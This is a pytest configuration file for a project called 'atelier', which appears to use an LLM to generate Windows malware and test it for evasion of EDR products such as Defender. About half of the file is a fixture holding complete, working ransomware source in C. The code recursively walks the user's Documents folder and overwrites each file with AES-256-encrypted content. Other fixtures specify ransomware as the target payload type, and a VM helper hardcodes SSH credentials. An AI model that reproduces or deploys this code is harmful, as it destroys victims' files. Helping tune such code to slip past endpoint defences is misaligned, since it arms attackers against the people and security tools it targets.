"""Shared fixtures and marker configuration for the atelier test suite."""

import asyncio
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

PROJECT_ROOT = Path(__file__).resolve().parent.parent


def pytest_configure(config):
    config.addinivalue_line("markers", "unit: Pure unit tests, no external resources")
    config.addinivalue_line("markers", "integration: Local resource tests (compiler, filesystem)")
    config.addinivalue_line("markers", "vm: Requires running Windows 11 QEMU VM")
    config.addinivalue_line("markers", "e2e: Full pipeline, requires LLM + VM")
    config.addinivalue_line("markers", "edr: EDR detection tests, requires running VM + EDR agent")


def pytest_collection_modifyitems(items):
    for item in items:
        path = str(item.fspath)
        if any(t in path for t in ("test_code_analysis", "test_evasion_passes", "test_config_models", "test_spec_parsing")):
            item.add_marker(pytest.mark.unit)
        elif any(t in path for t in ("test_compilation", "test_evasion_pipeline", "test_portal")):
            item.add_marker(pytest.mark.integration)
        elif "test_vm" in path:
            item.add_marker(pytest.mark.vm)
        elif "test_pipeline_e2e" in path:
            item.add_marker(pytest.mark.e2e)
        elif "test_edr" in path:
            item.add_marker(pytest.mark.edr)


@pytest.fixture
def sample_c_source():
    return (
        '#include <windows.h>\n'
        '#include <stdio.h>\n'
        '\n'
        'int main(int argc, char *argv[]) {\n'
        '    HANDLE hFile = CreateFileA("test.txt", GENERIC_WRITE, 0, NULL,\n'
        '                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n'
        '    if (hFile != INVALID_HANDLE_VALUE) {\n'
        '        const char *msg = "Hello from test";\n'
        '        DWORD written;\n'
        '        WriteFile(hFile, msg, strlen(msg), &written, NULL);\n'
        '        CloseHandle(hFile);\n'
        '    }\n'
        '    return 0;\n'
        '}\n'
    )


@pytest.fixture
def ransomware_c_source():
    return (
        '#include <windows.h>\n'
        '#include <wincrypt.h>\n'
        '#include <stdio.h>\n'
        '#include <string.h>\n'
        '#include <shlobj.h>\n'
        '\n'
        'static BOOL encrypt_file(const char *filepath) {\n'
        '    HANDLE hFile = CreateFileA(filepath, GENERIC_READ | GENERIC_WRITE, 0,\n'
        '                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n'
        '    if (hFile == INVALID_HANDLE_VALUE) return FALSE;\n'
        '    DWORD fileSize = GetFileSize(hFile, NULL);\n'
        '    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {\n'
        '        CloseHandle(hFile);\n'
        '        return FALSE;\n'
        '    }\n'
        '    BYTE *buffer = (BYTE*)HeapAlloc(GetProcessHeap(), 0, fileSize);\n'
        '    if (!buffer) { CloseHandle(hFile); return FALSE; }\n'
        '    DWORD bytesRead;\n'
        '    ReadFile(hFile, buffer, fileSize, &bytesRead, NULL);\n'
        '    HCRYPTPROV hProv;\n'
        '    CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);\n'
        '    HCRYPTHASH hHash;\n'
        '    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);\n'
        '    const char *password = "encryption_key_test";\n'
        '    CryptHashData(hHash, (BYTE*)password, strlen(password), 0);\n'
        '    HCRYPTKEY hKey;\n'
        '    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);\n'
        '    DWORD encLen = fileSize;\n'
        '    CryptEncrypt(hKey, 0, TRUE, 0, buffer, &encLen, fileSize + 32);\n'
        '    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);\n'
        '    WriteFile(hFile, buffer, encLen, &bytesRead, NULL);\n'
        '    CloseHandle(hFile);\n'
        '    HeapFree(GetProcessHeap(), 0, buffer);\n'
        '    CryptDestroyKey(hKey);\n'
        '    CryptDestroyHash(hHash);\n'
        '    CryptReleaseContext(hProv, 0);\n'
        '    return TRUE;\n'
        '}\n'
        '\n'
        'static void scan_and_encrypt(const char *dirpath) {\n'
        '    char searchPath[MAX_PATH];\n'
        '    snprintf(searchPath, MAX_PATH, "%s\\\\*", dirpath);\n'
        '    WIN32_FIND_DATAA fd;\n'
        '    HANDLE hFind = FindFirstFileA(searchPath, &fd);\n'
        '    if (hFind == INVALID_HANDLE_VALUE) return;\n'
        '    do {\n'
        '        if (fd.cFileName[0] == \'.\') continue;\n'
        '        char fullpath[MAX_PATH];\n'
        '        snprintf(fullpath, MAX_PATH, "%s\\\\%s", dirpath, fd.cFileName);\n'
        '        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {\n'
        '            scan_and_encrypt(fullpath);\n'
        '        } else {\n'
        '            encrypt_file(fullpath);\n'
        '        }\n'
        '    } while (FindNextFileA(hFind, &fd));\n'
        '    FindClose(hFind);\n'
        '}\n'
        '\n'
        'int main(int argc, char *argv[]) {\n'
        '    char userDir[MAX_PATH];\n'
        '    SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, userDir);\n'
        '    char docPath[MAX_PATH];\n'
        '    snprintf(docPath, MAX_PATH, "%s\\\\Documents", userDir);\n'
        '    scan_and_encrypt(docPath);\n'
        '    return 0;\n'
        '}\n'
    )


@pytest.fixture
def sample_spec_dict():
    return {
        "os_platform": "windows",
        "os_version": "windows-11",
        "edrs": ["defender"],
        "installed_compilers": ["mingw-w64"],
        "malware_type": "ransomware",
        "output_format": "exe",
    }


@pytest.fixture
def parsed_spec(sample_spec_dict):
    from atelier.target_spec import TargetEnvironmentSpec
    return TargetEnvironmentSpec(**sample_spec_dict)


@pytest.fixture
def tmp_spec_yaml(tmp_path):
    spec_file = tmp_path / "test_spec.yaml"
    spec_file.write_text(
        "os_platform: windows\n"
        "os_version: windows-11\n"
        "edrs:\n"
        "  - defender\n"
        "installed_compilers:\n"
        "  - mingw-w64\n"
        "malware_type: ransomware\n"
        "output_format: exe\n"
    )
    return str(spec_file)


@pytest.fixture
def mingw_available():
    if not shutil.which("x86_64-w64-mingw32-gcc"):
        pytest.skip("x86_64-w64-mingw32-gcc not found")


@pytest.fixture
def vm_ssh_ready():
    try:
        ret = subprocess.run(
            ["sshpass", "-pvmuser123", "ssh", "-p", "10022",
             "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
             "-o", "ConnectTimeout=5", "vmuser@localhost", "echo ready"],
            capture_output=True, text=True, timeout=10,
        )
        if ret.returncode != 0 or "ready" not in ret.stdout:
            pytest.skip("VM not reachable via SSH")
    except (subprocess.TimeoutExpired, FileNotFoundError):
        pytest.skip("VM not reachable or sshpass not installed")

    class VMHelper:
        def ssh_cmd(self, cmd, timeout=15):
            ret = subprocess.run(
                ["sshpass", "-pvmuser123", "ssh", "-p", "10022",
                 "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
                 "vmuser@localhost", cmd],
                capture_output=True, text=True, timeout=timeout,
            )
            return ret.stdout.strip()

        def scp(self, local_path, remote_path):
            ret = subprocess.run(
                ["sshpass", "-pvmuser123", "scp", "-P", "10022",
                 "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
                 str(local_path), f"vmuser@localhost:{remote_path}"],
                capture_output=True,
            )
            return ret.returncode == 0

    return VMHelper()


@pytest.fixture(scope="session")
def llm_semaphore():
    return asyncio.Semaphore(1)
